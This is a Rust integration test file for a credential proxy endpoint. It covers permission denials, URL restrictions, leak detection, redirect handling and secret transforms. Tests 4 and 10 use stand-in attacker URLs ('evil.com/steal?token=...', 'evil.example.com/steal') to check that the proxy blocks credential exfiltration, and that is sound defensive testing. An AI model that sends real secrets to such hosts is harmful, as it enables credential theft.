//! Integration tests for the credential proxy endpoint (POST /api/v1/proxy/execute).
//!
//! Uses `wiremock::MockServer` as the upstream HTTP server and the same in-memory
//! test harness as `jwt_grant_flow.rs`.

use axum::http::{Method, StatusCode};
use serde_json::{json, Value};
use uuid::Uuid;
use wiremock::matchers::{method, path};
use wiremock::{Mock, MockServer, ResponseTemplate};

use agent_cordon_core::crypto::SecretEncryptor;
use agent_cordon_core::domain::credential::{CredentialId, StoredCredential};
use agent_cordon_core::domain::workspace::{Workspace, WorkspaceId, WorkspaceStatus};
use agent_cordon_core::storage::Store;

use crate::common::*;
use agent_cordon_server::test_helpers::{TestAppBuilder, TestContext};

// ---------------------------------------------------------------------------
// Test helpers
// ---------------------------------------------------------------------------

// These constants are needed for tests that manually construct JWTs.
const MASTER_SECRET: &str = "integration-test-secret-at-least-16";
const KDF_SALT: &str = "test-salt-value!";

async fn setup_test_app() -> TestContext {
    TestAppBuilder::new().with_admin().build().await
}

async fn create_agent(
    store: &(dyn Store + Send + Sync),
    name: &str,
    tags: Vec<&str>,
    enabled: bool,
) -> (Workspace, String) {
    let now = chrono::Utc::now();
    let workspace = Workspace {
        id: WorkspaceId(Uuid::new_v4()),
        name: name.to_string(),
        enabled,
        status: WorkspaceStatus::Active,
        pk_hash: None,
        encryption_public_key: None,
        tags: tags.into_iter().map(String::from).collect(),
        owner_id: None,
        parent_id: None,
        tool_name: None,
        created_at: now,
        updated_at: now,
    };
    store
        .create_workspace(&workspace)
        .await
        .expect("create workspace");
    (workspace, String::new())
}

async fn store_test_credential(
    state: &agent_cordon_server::state::AppState,
    owner: &Workspace,
    name: &str,
    service: &str,
    secret: &str,
    scopes: Vec<&str>,
    allowed_url_pattern: Option<&str>,
) -> CredentialId {
    let now = chrono::Utc::now();
    let cred_id = CredentialId(Uuid::new_v4());
    let (encrypted, nonce) = state
        .encryptor
        .encrypt(secret.as_bytes(), cred_id.0.to_string().as_bytes())
        .expect("encrypt");
    let cred = StoredCredential {
        id: cred_id.clone(),
        name: name.to_string(),
        service: service.to_string(),
        encrypted_value: encrypted,
        nonce,
        scopes: scopes.into_iter().map(String::from).collect(),
        metadata: json!({}),
        created_by: Some(owner.id.clone()),
        created_by_user: None,
        created_at: now,
        updated_at: now,
        allowed_url_pattern: allowed_url_pattern.map(String::from),
        expires_at: None,
        transform_script: None,
        transform_name: None,
        vault: "default".to_string(),
        credential_type: "generic".to_string(),
        tags: vec![],
        description: None,
        target_identity: None,
        key_version: 1,
    };
    state
        .store
        .store_credential(&cred)
        .await
        .expect("store credential");

    for perm in &["read", "write", "delete", "delegated_use"] {
        grant_cedar_permission(state, &cred_id, &owner.id, perm).await;
    }

    cred_id
}

/// Get admin JWT via device-mediated token exchange.
async fn get_admin_jwt(ctx: &TestContext) -> String {
    let dev = ctx.admin_device.as_ref().expect("admin device");
    get_jwt_via_device(&ctx.state, &dev.signing_key, &dev.device_id, &ctx.admin_key).await
}

/// Send dual auth request with admin device.
async fn send_dual(
    ctx: &TestContext,
    method: Method,
    uri: &str,
    agent_jwt: &str,
    body: Option<Value>,
) -> (StatusCode, Value) {
    let dev = ctx.admin_device.as_ref().expect("admin device");
    send_json_dual_auth(
        &ctx.app,
        method,
        uri,
        &dev.signing_key,
        &dev.device_id,
        agent_jwt,
        body,
    )
    .await
}

// ===========================================================================
// 1. Happy path: valid JWT + valid credential + matching URL
// ===========================================================================

#[tokio::test]
async fn proxy_happy_path_returns_upstream_response() {
    let ctx = setup_test_app().await;
    let admin = ctx.admin_agent.as_ref().unwrap();
    let _store = &*ctx.store;
    let _encryptor = &*ctx.encryptor;
    let mock_server = MockServer::start().await;

    Mock::given(method("GET"))
        .and(path("/api/data"))
        .respond_with(ResponseTemplate::new(200).set_body_json(json!({"result": "ok"})))
        .mount(&mock_server)
        .await;

    let secret = "ghp_super_secret_token_12345";
    let _cred_id = store_test_credential(
        &ctx.state,
        admin,
        "github-pat",
        "github",
        secret,
        vec!["repo"],
        None,
    )
    .await;

    let jwt = get_admin_jwt(&ctx).await;

    let upstream_url = format!("{}/api/data", mock_server.uri());
    let (status, body) = send_dual(
        &ctx,
        Method::POST,
        "/api/v1/proxy/execute",
        &jwt,
        Some(json!({
            "method": "GET",
            "url": upstream_url,
            "headers": {"Authorization": "Bearer {{github-pat}}"}
        })),
    )
    .await;

    assert_eq!(status, StatusCode::OK, "response: {}", body);
    let data = &body["data"];
    assert_eq!(data["status_code"], 200);
    let resp_body: Value = serde_json::from_str(data["body"].as_str().unwrap()).unwrap();
    assert_eq!(resp_body["result"], "ok");
}

// ===========================================================================
// 2. Unknown credential → 404
// ===========================================================================

#[tokio::test]
async fn proxy_unknown_credential_returns_404() {
    let ctx = setup_test_app().await;
    let jwt = get_admin_jwt(&ctx).await;

    let (status, body) = send_dual(
        &ctx,
        Method::POST,
        "/api/v1/proxy/execute",
        &jwt,
        Some(json!({
            "method": "GET",
            "url": "https://api.example.com/v1?token={{nonexistent-cred}}",
        })),
    )
    .await;

    assert_eq!(status, StatusCode::NOT_FOUND, "response: {}", body);
    assert!(
        body["error"]["message"]
            .as_str()
            .unwrap()
            .contains("nonexistent-cred"),
        "error should mention the missing credential name"
    );
}

// ===========================================================================
// 3. Policy denied: agent without delegated_use permission → 403
// ===========================================================================

#[tokio::test]
async fn proxy_policy_denied_returns_403() {
    let ctx = setup_test_app().await;
    let admin = ctx.admin_agent.as_ref().unwrap();
    let store = &*ctx.store;
    let _encryptor = &*ctx.encryptor;

    // Create a non-admin agent with no permissions on the credential
    let (viewer, viewer_key) = create_agent(store, "viewer-bot", vec!["viewer"], true).await;
    let (viewer_device_id, viewer_signing_key) =
        create_device_and_bind_agent(&ctx.state, &viewer).await;
    let viewer_jwt = get_jwt_via_device(
        &ctx.state,
        &viewer_signing_key,
        &viewer_device_id,
        &viewer_key,
    )
    .await;

    // Store credential owned by admin — viewer has no permissions
    let _cred_id = store_test_credential(
        &ctx.state,
        admin,
        "admin-secret",
        "slack",
        "xoxb-secret-value",
        vec!["chat:write"],
        None,
    )
    .await;

    let (status, body) = send_json_dual_auth(
        &ctx.app,
        Method::POST,
        "/api/v1/proxy/execute",
        &viewer_signing_key,
        &viewer_device_id,
        &viewer_jwt,
        Some(json!({
            "method": "GET",
            "url": "https://slack.com/api/chat.postMessage?token={{admin-secret}}",
        })),
    )
    .await;

    // v1.15.0: vend_credential requires explicit grants or ownership match.
    // Viewer has no grants on the admin-owned credential → proxy denied.
    assert_eq!(
        status,
        StatusCode::FORBIDDEN,
        "proxy without grants should be denied: {}",
        body
    );
}

// ===========================================================================
// 4. URL mismatch: credential pattern doesn't match request URL → 403
// ===========================================================================

#[tokio::test]
async fn proxy_url_mismatch_returns_403() {
    let ctx = setup_test_app().await;
    let admin = ctx.admin_agent.as_ref().unwrap();
    let _store = &*ctx.store;
    let _encryptor = &*ctx.encryptor;

    // Credential only allowed for github.com URLs
    let _cred_id = store_test_credential(
        &ctx.state,
        admin,
        "github-restricted",
        "github",
        "ghp_restricted_token_xyz",
        vec!["repo"],
        Some("https://api.github.com/*"),
    )
    .await;

    let jwt = get_admin_jwt(&ctx).await;

    // Try to use it with a different domain
    let (status, body) = send_dual(
        &ctx,
        Method::POST,
        "/api/v1/proxy/execute",
        &jwt,
        Some(json!({
            "method": "GET",
            "url": "https://evil.com/steal?token={{github-restricted}}",
        })),
    )
    .await;

    assert_eq!(status, StatusCode::FORBIDDEN, "response: {}", body);
    assert!(
        body["error"]["message"]
            .as_str()
            .unwrap()
            .contains("URL not allowed"),
        "error should mention URL restriction"
    );
}

// ===========================================================================
// 5. Credential leak: upstream echoes credential value → 502
// ===========================================================================

#[tokio::test]
async fn proxy_credential_leak_detected_returns_502() {
    let ctx = setup_test_app().await;
    let admin = ctx.admin_agent.as_ref().unwrap();
    let _store = &*ctx.store;
    let _encryptor = &*ctx.encryptor;
    let mock_server = MockServer::start().await;

    let secret = "super_secret_api_key_12345";

    // The upstream echoes the secret back in its response
    Mock::given(method("GET"))
        .and(path("/echo"))
        .respond_with(
            ResponseTemplate::new(200).set_body_string(format!("your token is: {}", secret)),
        )
        .mount(&mock_server)
        .await;

    let _cred_id = store_test_credential(
        &ctx.state,
        admin,
        "leaky-cred",
        "test-service",
        secret,
        vec!["read"],
        None,
    )
    .await;

    let jwt = get_admin_jwt(&ctx).await;

    let upstream_url = format!("{}/echo", mock_server.uri());
    let (status, body) = send_dual(
        &ctx,
        Method::POST,
        "/api/v1/proxy/execute",
        &jwt,
        Some(json!({
            "method": "GET",
            "url": upstream_url,
            "headers": {"Authorization": "Bearer {{leaky-cred}}"}
        })),
    )
    .await;

    assert_eq!(status, StatusCode::BAD_GATEWAY, "response: {}", body);
    assert_eq!(
        body["error"]["code"].as_str().unwrap(),
        "credential_leak_detected"
    );
}

// ===========================================================================
// 6. Multiple placeholders: two credentials both resolved
// ===========================================================================

#[tokio::test]
async fn proxy_multiple_placeholders_resolved() {
    let ctx = setup_test_app().await;
    let admin = ctx.admin_agent.as_ref().unwrap();
    let _store = &*ctx.store;
    let _encryptor = &*ctx.encryptor;
    let mock_server = MockServer::start().await;

    Mock::given(method("POST"))
        .and(path("/multi"))
        .respond_with(ResponseTemplate::new(200).set_body_string("multi-ok"))
        .mount(&mock_server)
        .await;

    let _cred1 = store_test_credential(
        &ctx.state,
        admin,
        "cred-alpha",
        "svc-a",
        "alpha_secret_value",
        vec!["read"],
        None,
    )
    .await;

    let _cred2 = store_test_credential(
        &ctx.state,
        admin,
        "cred-beta",
        "svc-b",
        "beta_secret_value",
        vec!["write"],
        None,
    )
    .await;

    let jwt = get_admin_jwt(&ctx).await;

    let upstream_url = format!("{}/multi", mock_server.uri());
    let (status, body) = send_dual(
        &ctx,
        Method::POST,
        "/api/v1/proxy/execute",
        &jwt,
        Some(json!({
            "method": "POST",
            "url": upstream_url,
            "headers": {
                "X-Auth-A": "{{cred-alpha}}",
                "X-Auth-B": "{{cred-beta}}"
            },
            "body": "payload"
        })),
    )
    .await;

    assert_eq!(status, StatusCode::OK, "response: {}", body);
    assert_eq!(body["data"]["status_code"], 200);
    assert_eq!(body["data"]["body"], "multi-ok");
}

// ===========================================================================
// 7. HTTP methods: GET and POST both work
// ===========================================================================

#[tokio::test]
async fn proxy_get_method_works() {
    let ctx = setup_test_app().await;
    let admin = ctx.admin_agent.as_ref().unwrap();
    let _store = &*ctx.store;
    let _encryptor = &*ctx.encryptor;
    let mock_server = MockServer::start().await;

    Mock::given(method("GET"))
        .and(path("/get-test"))
        .respond_with(ResponseTemplate::new(200).set_body_string("get-ok"))
        .mount(&mock_server)
        .await;

    let _cred_id = store_test_credential(
        &ctx.state,
        admin,
        "get-cred",
        "test",
        "get_secret_value",
        vec!["read"],
        None,
    )
    .await;

    let jwt = get_admin_jwt(&ctx).await;
    let upstream_url = format!("{}/get-test", mock_server.uri());

    let (status, body) = send_dual(
        &ctx,
        Method::POST,
        "/api/v1/proxy/execute",
        &jwt,
        Some(json!({
            "method": "GET",
            "url": upstream_url,
            "headers": {"Authorization": "token {{get-cred}}"}
        })),
    )
    .await;

    assert_eq!(status, StatusCode::OK, "response: {}", body);
    assert_eq!(body["data"]["status_code"], 200);
    assert_eq!(body["data"]["body"], "get-ok");
}

#[tokio::test]
async fn proxy_post_method_works() {
    let ctx = setup_test_app().await;
    let admin = ctx.admin_agent.as_ref().unwrap();
    let _store = &*ctx.store;
    let _encryptor = &*ctx.encryptor;
    let mock_server = MockServer::start().await;

    Mock::given(method("POST"))
        .and(path("/post-test"))
        .respond_with(ResponseTemplate::new(201).set_body_string("created"))
        .mount(&mock_server)
        .await;

    let _cred_id = store_test_credential(
        &ctx.state,
        admin,
        "post-cred",
        "test",
        "post_secret_value",
        vec!["write"],
        None,
    )
    .await;

    let jwt = get_admin_jwt(&ctx).await;
    let upstream_url = format!("{}/post-test", mock_server.uri());

    let (status, body) = send_dual(
        &ctx,
        Method::POST,
        "/api/v1/proxy/execute",
        &jwt,
        Some(json!({
            "method": "POST",
            "url": upstream_url,
            "headers": {"Authorization": "Bearer {{post-cred}}"},
            "body": "{\"data\": \"hello\"}"
        })),
    )
    .await;

    assert_eq!(status, StatusCode::OK, "response: {}", body);
    assert_eq!(body["data"]["status_code"], 201);
    assert_eq!(body["data"]["body"], "created");
}

// ===========================================================================
// 8. Expired JWT → 401
// ===========================================================================

#[tokio::test]
async fn proxy_expired_jwt_returns_401() {
    let ctx = setup_test_app().await;
    let admin = ctx.admin_agent.as_ref().unwrap();
    let _store = &*ctx.store;
    let _encryptor = &*ctx.encryptor;

    let _cred_id = store_test_credential(
        &ctx.state,
        admin,
        "expire-proxy-test",
        "test",
        "secret_val",
        vec!["read"],
        None,
    )
    .await;

    // Create an expired JWT manually (signed with ES256)
    use agent_cordon_core::crypto::key_derivation::derive_jwt_signing_keypair;
    let (sk, _vk) = derive_jwt_signing_keypair(MASTER_SECRET, KDF_SALT.as_bytes())
        .expect("derive jwt es256 keypair");
    let private_pem = {
        use p256::pkcs8::EncodePrivateKey;
        sk.to_pkcs8_pem(p256::pkcs8::LineEnding::LF)
            .expect("P-256 key to PKCS#8 PEM")
            .to_string()
    };
    let encoding_key = jsonwebtoken::EncodingKey::from_ec_pem(private_pem.as_bytes()).unwrap();
    let now = chrono::Utc::now();
    let expired_claims = agent_cordon_core::auth::jwt::JwtClaims {
        iss: agent_cordon_core::auth::jwt::ISSUER.to_string(),
        sub: admin.id.0.to_string(),
        aud: "agent-cordon:auth".to_string(),
        exp: (now - chrono::Duration::seconds(300)).timestamp(),
        iat: (now - chrono::Duration::seconds(600)).timestamp(),
        nbf: (now - chrono::Duration::seconds(600)).timestamp(),
        jti: Uuid::new_v4().to_string(),
        roles: admin.tags.clone(),
    };
    let expired_token = jsonwebtoken::encode(
        &jsonwebtoken::Header::new(jsonwebtoken::Algorithm::ES256),
        &expired_claims,
        &encoding_key,
    )
    .expect("encode expired token");

    let (status, _body) = send_dual(
        &ctx,
        Method::POST,
        "/api/v1/proxy/execute",
        &expired_token,
        Some(json!({
            "method": "GET",
            "url": "https://example.com/api?token={{expire-proxy-test}}",
        })),
    )
    .await;

    assert_eq!(
        status,
        StatusCode::UNAUTHORIZED,
        "expired JWT should be rejected"
    );
}

// ===========================================================================
// 9. No placeholders → 400
// ===========================================================================

#[tokio::test]
async fn proxy_no_placeholders_returns_400() {
    let ctx = setup_test_app().await;
    let jwt = get_admin_jwt(&ctx).await;

    let (status, body) = send_dual(
        &ctx,
        Method::POST,
        "/api/v1/proxy/execute",
        &jwt,
        Some(json!({
            "method": "GET",
            "url": "https://example.com/api/data",
            "headers": {"Content-Type": "application/json"}
        })),
    )
    .await;

    assert_eq!(status, StatusCode::BAD_REQUEST, "response: {}", body);
    assert!(
        body["error"]["message"]
            .as_str()
            .unwrap()
            .contains("no credential placeholders"),
        "error should mention missing placeholders"
    );
}

// ===========================================================================
// 10. Cross-domain redirect: 302 to different domain → NOT followed
// ===========================================================================

#[tokio::test]
async fn proxy_cross_domain_redirect_not_followed() {
    let ctx = setup_test_app().await;
    let admin = ctx.admin_agent.as_ref().unwrap();
    let _store = &*ctx.store;
    let _encryptor = &*ctx.encryptor;
    let mock_server = MockServer::start().await;

    // Upstream returns a 302 redirect to a completely different domain
    Mock::given(method("GET"))
        .and(path("/redirect-away"))
        .respond_with(
            ResponseTemplate::new(302).insert_header("location", "https://evil.example.com/steal"),
        )
        .mount(&mock_server)
        .await;

    let _cred_id = store_test_credential(
        &ctx.state,
        admin,
        "redirect-cred",
        "test",
        "redirect_secret_val",
        vec!["read"],
        None,
    )
    .await;

    let jwt = get_admin_jwt(&ctx).await;
    let upstream_url = format!("{}/redirect-away", mock_server.uri());

    let (status, body) = send_dual(
        &ctx,
        Method::POST,
        "/api/v1/proxy/execute",
        &jwt,
        Some(json!({
            "method": "GET",
            "url": upstream_url,
            "headers": {"Authorization": "Bearer {{redirect-cred}}"}
        })),
    )
    .await;

    // The proxy should return the 302 response as-is, NOT follow it
    assert_eq!(status, StatusCode::OK, "response: {}", body);
    assert_eq!(body["data"]["status_code"], 302);
    let resp_headers = &body["data"]["headers"];
    assert_eq!(
        resp_headers["location"].as_str().unwrap(),
        "https://evil.example.com/steal",
        "redirect location should be passed through"
    );
}

// ===========================================================================
// Helper: store a credential with transform fields
// ===========================================================================

#[allow(clippy::too_many_arguments)]
async fn store_test_credential_with_transform(
    state: &agent_cordon_server::state::AppState,
    owner: &Workspace,
    name: &str,
    service: &str,
    secret: &str,
    scopes: Vec<&str>,
    transform_name: Option<&str>,
    transform_script: Option<&str>,
) -> CredentialId {
    let now = chrono::Utc::now();
    let cred_id = CredentialId(Uuid::new_v4());
    let (encrypted, nonce) = state
        .encryptor
        .encrypt(secret.as_bytes(), cred_id.0.to_string().as_bytes())
        .expect("encrypt");
    let cred = StoredCredential {
        id: cred_id.clone(),
        name: name.to_string(),
        service: service.to_string(),
        encrypted_value: encrypted,
        nonce,
        scopes: scopes.into_iter().map(String::from).collect(),
        metadata: json!({}),
        created_by: Some(owner.id.clone()),
        created_by_user: None,
        created_at: now,
        updated_at: now,
        allowed_url_pattern: None,
        expires_at: None,
        transform_script: transform_script.map(String::from),
        transform_name: transform_name.map(String::from),
        vault: "default".to_string(),
        credential_type: "generic".to_string(),
        tags: vec![],
        description: None,
        target_identity: None,
        key_version: 1,
    };
    state
        .store
        .store_credential(&cred)
        .await
        .expect("store credential");

    for perm in &["read", "write", "delete", "delegated_use"] {
        grant_cedar_permission(state, &cred_id, &owner.id, perm).await;
    }

    cred_id
}

// ===========================================================================
// 11. Transform: bearer built-in transform applied in proxy
// ===========================================================================

#[tokio::test]
async fn proxy_bearer_transform_applies() {
    let ctx = setup_test_app().await;
    let admin = ctx.admin_agent.as_ref().unwrap();
    let _store = &*ctx.store;
    let _encryptor = &*ctx.encryptor;
    let mock_server = MockServer::start().await;

    // The mock expects "Bearer my-raw-token" in the Authorization header
    Mock::given(method("GET"))
        .and(path("/api/bearer-test"))
        .and(wiremock::matchers::header(
            "Authorization",
            "Bearer my-raw-token",
        ))
        .respond_with(ResponseTemplate::new(200).set_body_string("bearer-ok"))
        .mount(&mock_server)
        .await;

    // Store credential with "bearer" transform — the raw secret is just the token
    let _cred_id = store_test_credential_with_transform(
        &ctx.state,
        admin,
        "bearer-cred",
        "test",
        "my-raw-token",
        vec!["read"],
        Some("bearer"),
        None,
    )
    .await;

    let jwt = get_admin_jwt(&ctx).await;
    let upstream_url = format!("{}/api/bearer-test", mock_server.uri());

    let (status, body) = send_dual(
        &ctx,
        Method::POST,
        "/api/v1/proxy/execute",
        &jwt,
        Some(json!({
            "method": "GET",
            "url": upstream_url,
            "headers": {"Authorization": "{{bearer-cred}}"}
        })),
    )
    .await;

    assert_eq!(status, StatusCode::OK, "response: {}", body);
    assert_eq!(body["data"]["status_code"], 200);
    assert_eq!(body["data"]["body"], "bearer-ok");
}

// ===========================================================================
// 12. Transform: basic-auth built-in transform applied in proxy
// ===========================================================================

#[tokio::test]
async fn proxy_basic_auth_transform_applies() {
    let ctx = setup_test_app().await;
    let admin = ctx.admin_agent.as_ref().unwrap();
    let _store = &*ctx.store;
    let _encryptor = &*ctx.encryptor;
    let mock_server = MockServer::start().await;

    // "user:pass" base64 = "dXNlcjpwYXNz"
    Mock::given(method("GET"))
        .and(path("/api/basic-test"))
        .and(wiremock::matchers::header(
            "Authorization",
            "Basic dXNlcjpwYXNz",
        ))
        .respond_with(ResponseTemplate::new(200).set_body_string("basic-ok"))
        .mount(&mock_server)
        .await;

    let _cred_id = store_test_credential_with_transform(
        &ctx.state,
        admin,
        "basic-cred",
        "test",
        "user:pass",
        vec!["read"],
        Some("basic-auth"),
        None,
    )
    .await;

    let jwt = get_admin_jwt(&ctx).await;
    let upstream_url = format!("{}/api/basic-test", mock_server.uri());

    let (status, body) = send_dual(
        &ctx,
        Method::POST,
        "/api/v1/proxy/execute",
        &jwt,
        Some(json!({
            "method": "GET",
            "url": upstream_url,
            "headers": {"Authorization": "{{basic-cred}}"}
        })),
    )
    .await;

    assert_eq!(status, StatusCode::OK, "response: {}", body);
    assert_eq!(body["data"]["status_code"], 200);
    assert_eq!(body["data"]["body"], "basic-ok");
}

// ===========================================================================
// 13. Transform: custom Rhai script applied in proxy
// ===========================================================================

#[tokio::test]
async fn proxy_custom_rhai_script_transform() {
    let ctx = setup_test_app().await;
    let admin = ctx.admin_agent.as_ref().unwrap();
    let _store = &*ctx.store;
    let _encryptor = &*ctx.encryptor;
    let mock_server = MockServer::start().await;

    // The script will uppercase the secret
    Mock::given(method("POST"))
        .and(path("/api/rhai-test"))
        .respond_with(ResponseTemplate::new(200).set_body_string("rhai-ok"))
        .mount(&mock_server)
        .await;

    let script = r#"secret.to_upper()"#;
    let _cred_id = store_test_credential_with_transform(
        &ctx.state,
        admin,
        "rhai-cred",
        "test",
        "my-secret",
        vec!["read"],
        None,
        Some(script),
    )
    .await;

    let jwt = get_admin_jwt(&ctx).await;
    let upstream_url = format!("{}/api/rhai-test", mock_server.uri());

    let (status, body) = send_dual(
        &ctx,
        Method::POST,
        "/api/v1/proxy/execute",
        &jwt,
        Some(json!({
            "method": "POST",
            "url": upstream_url,
            "headers": {"X-Token": "{{rhai-cred}}"},
            "body": "test-body"
        })),
    )
    .await;

    assert_eq!(status, StatusCode::OK, "response: {}", body);
    assert_eq!(body["data"]["status_code"], 200);
}

// ===========================================================================
// 14. Transform: no transform = identity (backward compatible)
// ===========================================================================

#[tokio::test]
async fn proxy_no_transform_identity_passthrough() {
    let ctx = setup_test_app().await;
    let admin = ctx.admin_agent.as_ref().unwrap();
    let _store = &*ctx.store;
    let _encryptor = &*ctx.encryptor;
    let mock_server = MockServer::start().await;

    let secret = "raw_identity_token_abc";

    Mock::given(method("GET"))
        .and(path("/api/identity-test"))
        .and(wiremock::matchers::header(
            "Authorization",
            format!("token {}", secret).as_str(),
        ))
        .respond_with(ResponseTemplate::new(200).set_body_string("identity-ok"))
        .mount(&mock_server)
        .await;

    // No transform fields set — should pass through as identity
    let _cred_id = store_test_credential(
        &ctx.state,
        admin,
        "identity-cred",
        "test",
        secret,
        vec!["read"],
        None,
    )
    .await;

    let jwt = get_admin_jwt(&ctx).await;
    let upstream_url = format!("{}/api/identity-test", mock_server.uri());

    let (status, body) = send_dual(
        &ctx,
        Method::POST,
        "/api/v1/proxy/execute",
        &jwt,
        Some(json!({
            "method": "GET",
            "url": upstream_url,
            "headers": {"Authorization": "token {{identity-cred}}"}
        })),
    )
    .await;

    assert_eq!(status, StatusCode::OK, "response: {}", body);
    assert_eq!(body["data"]["status_code"], 200);
    assert_eq!(body["data"]["body"], "identity-ok");
}

// ===========================================================================
// 15. Create credential with transform via API
// ===========================================================================

#[tokio::test]
async fn create_credential_with_transform_via_api() {
    let ctx = setup_test_app().await;
    let jwt = get_admin_jwt(&ctx).await;

    // Create credential with transform_name
    let (status, body) = send_dual(
        &ctx,
        Method::POST,
        "/api/v1/credentials",
        &jwt,
        Some(json!({
            "name": "api-transform-cred",
            "service": "test",
            "secret_value": "user:pass",
            "transform_name": "basic-auth"
        })),
    )
    .await;

    assert_eq!(status, StatusCode::OK, "response: {}", body);
    let data = &body["data"];
    assert_eq!(data["name"], "api-transform-cred");
    assert_eq!(data["transform_name"], "basic-auth");
    assert!(data["transform_script"].is_null());
}

// ===========================================================================
// 16. Create credential with transform script via API
// ===========================================================================

#[tokio::test]
async fn create_credential_with_transform_script_via_api() {
    let ctx = setup_test_app().await;
    let jwt = get_admin_jwt(&ctx).await;

    let script = r#"base64_encode(secret)"#;

    let (status, body) = send_dual(
        &ctx,
        Method::POST,
        "/api/v1/credentials",
        &jwt,
        Some(json!({
            "name": "script-cred",
            "service": "test",
            "secret_value": "hello",
            "transform_script": script
        })),
    )
    .await;

    assert_eq!(status, StatusCode::OK, "response: {}", body);
    let data = &body["data"];
    assert_eq!(data["name"], "script-cred");
    assert_eq!(data["transform_script"], script);
    assert!(data["transform_name"].is_null());
}

// ===========================================================================
// 17. Leak scanning uses raw secret, not transformed value
// ===========================================================================

#[tokio::test]
async fn proxy_leak_scan_uses_raw_secret_not_transformed() {
    let ctx = setup_test_app().await;
    let admin = ctx.admin_agent.as_ref().unwrap();
    let _store = &*ctx.store;
    let _encryptor = &*ctx.encryptor;
    let mock_server = MockServer::start().await;

    let raw_secret = "super_secret_raw_value_12345";

    // Upstream echoes the raw secret. Bearer transform means the injected
    // value is "Bearer <raw_secret>", but leak scanning should check
    // against the raw secret.
    Mock::given(method("GET"))
        .and(path("/echo-raw"))
        .respond_with(ResponseTemplate::new(200).set_body_string(format!("leaked: {}", raw_secret)))
        .mount(&mock_server)
        .await;

    let _cred_id = store_test_credential_with_transform(
        &ctx.state,
        admin,
        "leak-transform-cred",
        "test",
        raw_secret,
        vec!["read"],
        Some("bearer"),
        None,
    )
    .await;

    let jwt = get_admin_jwt(&ctx).await;
    let upstream_url = format!("{}/echo-raw", mock_server.uri());

    let (status, body) = send_dual(
        &ctx,
        Method::POST,
        "/api/v1/proxy/execute",
        &jwt,
        Some(json!({
            "method": "GET",
            "url": upstream_url,
            "headers": {"Authorization": "{{leak-transform-cred}}"}
        })),
    )
    .await;

    // Should detect the leak of the raw secret
    assert_eq!(status, StatusCode::BAD_GATEWAY, "response: {}", body);
    assert_eq!(
        body["error"]["code"].as_str().unwrap(),
        "credential_leak_detected"
    );
}
